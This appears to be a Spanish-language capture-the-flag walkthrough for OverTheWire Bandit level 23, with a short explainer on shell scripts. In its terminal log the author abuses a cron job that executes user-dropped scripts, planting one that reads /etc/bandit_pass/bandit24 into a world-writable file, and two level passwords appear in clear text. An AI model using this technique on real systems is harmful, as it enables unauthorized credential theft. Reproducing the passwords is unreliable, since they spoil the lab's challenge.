----
### OBJETIVO 
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

---
### DATOS DE ACCESO
	Servidor : ssh bandit23@bandit.labs.overthewire.org -p 2220
	Contraseña : QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G

---
### SOLUCION

	bandit23@bandit:~$ ls -la /etc/cron.d/
		total 56
		drwxr-xr-x   2 root root  4096 Apr 23 18:05 .
		drwxr-xr-x 108 root root 12288 Aug 12 08:42 ..
		-rw-r--r--   1 root root    62 Apr 23 18:04 cronjob_bandit15_root
		-rw-r--r--   1 root root    62 Apr 23 18:04 cronjob_bandit17_root
		-rw-r--r--   1 root root   120 Apr 23 18:04 cronjob_bandit22
		-rw-r--r--   1 root root   122 Apr 23 18:04 cronjob_bandit23
		-rw-r--r--   1 root root   120 Apr 23 18:04 cronjob_bandit24
		-rw-r--r--   1 root root    62 Apr 23 18:04 cronjob_bandit25_root
		-rw-r--r--   1 root root   201 Jan  8  2022 e2scrub_all
		-rwx------   1 root root    52 Apr 23 18:05 otw-tmp-dir
		-rw-r--r--   1 root root   102 Mar 23  2022 .placeholder
		-rw-r--r--   1 root root   396 Feb  2  2021 sysstat
	bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
		@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
		* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
	bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
		#!/bin/bash
		
		myname=$(whoami)
		
		cd /var/spool/$myname/foo || exit 1
		echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
		for i in * .*;
		do
		    if [ "$i" != "." -a "$i" != ".." ];
		    then
		        echo "Handling $i"
		        owner="$(stat --format "%U" ./$i)"
		        if [ "${owner}" = "bandit23" ]; then
		            timeout -s 9 60 ./$i
		        fi
		        rm -rf ./$i
		    fi
		done
	
	bandit23@bandit:~$ mkdir /tmp/ojtr/
	bandit23@bandit:~$ cd /tmp/ojtr
	bandit23@bandit:/tmp/ojtr$ echo "cat /etc/bandit_pass/bandit24 > /tmp/ojtr/password" > scriptojtr.sh
	bandit23@bandit:/tmp/ojtr$ cat scriptojtr.sh
		cat /etc/bandit_pass/bandit24 > /tmp/ojtr/password
	bandit23@bandit:/tmp/ojtr$ chmod +x scriptojtr.sh
	bandit23@bandit:/tmp/ojtr$ touch password
	bandit23@bandit:/tmp/ojtr$ chmod 666 password
	bandit23@bandit:/tmp/ojtr$ ls -la
		total 10564
		drwxrwxr-x    2 bandit23 bandit23     4096 Sep 20 02:25 .
		drwxrwx-wt 1710 root     root     10801152 Sep 20 02:25 ..
		-rw-rw-rw-    1 bandit23 bandit23        0 Sep 20 02:25 password
		-rwxrwxr-x    1 bandit23 bandit23       51 Sep 20 02:24 scriptojtr.sh
	bandit23@bandit:/tmp/ojtr$ cp scriptojtr.sh /var/spool/bandit24/foo
	bandit23@bandit:/tmp/ojtr$ ls -la
		total 10564
		drwxrwxr-x    2 bandit23 bandit23     4096 Sep 20 02:25 .
		drwxrwx-wt 1711 root     root     10801152 Sep 20 02:26 ..
		-rw-rw-rw-    1 bandit23 bandit23        0 Sep 20 02:25 password
		-rwxrwxr-x    1 bandit23 bandit23       51 Sep 20 02:24 scriptojtr.sh
	bandit23@bandit:/tmp/ojtr$ date
		Wed Sep 20 02:27:01 AM UTC 2023
	bandit23@bandit:/tmp/ojtr$ ls -la
		total 10568
		drwxrwxr-x    2 bandit23 bandit23     4096 Sep 20 02:25 .
		drwxrwx-wt 1711 root     root     10801152 Sep 20 02:27 ..
		-rw-rw-rw-    1 bandit23 bandit23       33 Sep 20 02:27 password
		-rwxrwxr-x    1 bandit23 bandit23       51 Sep 20 02:24 scriptojtr.sh
	bandit23@bandit:/tmp/ojtr$ cat password
	Contraseña : VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar

---
### NOTAS ADICCIONALES

Un shell script es un archivo de texto que contiene una secuencia de comandos y operaciones que el intérprete de comandos, o shell, puede ejecutar automáticamente. Un shell es una interfaz de usuario que permite interactuar con el sistema operativo mediante comandos de texto.

Existen varios tipos de shell en Linux, como Bash (Bourne Again Shell), CSH (C Shell) y KSH (Korn Shell). Sin embargo, Bash es el más utilizado y estandarizado en la mayoría de las distribuciones de Linux.

---
### REFERENCIAS
https://www.dongee.com/tutoriales/que-es-un-shell-script-en-linux-y-algunos-ejemplos-basicos-para-comenzar/